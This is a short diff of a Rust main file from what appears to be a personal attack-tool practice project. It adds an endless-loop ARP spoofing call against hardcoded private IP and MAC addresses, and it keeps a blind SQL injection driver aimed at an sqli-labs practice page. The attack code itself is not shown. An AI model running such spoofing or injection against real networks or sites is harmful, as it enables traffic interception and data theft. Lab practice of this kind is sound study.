@@ -1,14 +1,23 @@
 use std::collections::HashMap;
+use std::net::Ipv4Addr;
 
+use pnet::datalink::MacAddr;
 use regex::Regex;
 
+use crate::proto_attack::arp::spoof::*;
 use crate::sql_inject::blind::bool::*;
 
 mod sql_inject;
 mod trojan;
+mod proto_attack;
 
 #[tokio::main]
 async fn main() {
+    arp_spoof_test();
+}
+
+
+async fn blind_sql_inject_test() {
     let re = Regex::new(r"[, ]+").unwrap();
     let url = "http://100.80.144.127/sqli-labs/Less-8/";
 
@@ -38,4 +47,12 @@ async fn main() {
     println!("{:?}", &table_vec);
     println!("{:?}", &columns_map);
     println!("{:?}", &values_map);
+}
+
+fn arp_spoof_test() {
+    loop {
+        attack(MacAddr(0x69, 0x3e, 0x5f, 0x52, 0xa0, 0xf9),
+               Ipv4Addr::new(172, 20, 10, 13),
+               Ipv4Addr::new(172, 20, 10, 1));
+    }
 }
